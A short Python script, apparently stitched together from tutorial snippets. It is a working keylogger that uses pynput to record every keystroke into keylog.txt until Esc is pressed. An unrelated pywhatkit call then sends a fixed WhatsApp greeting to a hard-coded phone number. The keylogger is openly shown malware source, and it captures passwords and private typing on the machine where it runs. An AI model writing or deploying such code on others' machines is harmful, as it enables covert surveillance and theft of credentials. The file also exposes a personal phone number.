from pynput.keyboard import Key
from pynput.keyboard import Listener

import pywhatkit


the_keys = []

def functionPerKey(key):
    # appending each pressed key to a list
    the_keys.append(key)
    # writing list to file after each key pressed
    storeKeysToFile(the_keys)

def storeKeysToFile(keys):
    with open('keylog.txt', 'w') as log:
        for the_key in keys:
            the_key = str(the_key).replace("'", "")
            log.write(the_key)


def onEachKeyRelease(the_key):
    if the_key == Key.esc:
        return False


with Listener(
        on_press=functionPerKey,
        on_release=onEachKeyRelease
) as the_listener:
    the_listener.join()



pywhatkit.sendwhatmsg("+917092239434",
                      "Geeks For Geeks!",10,17)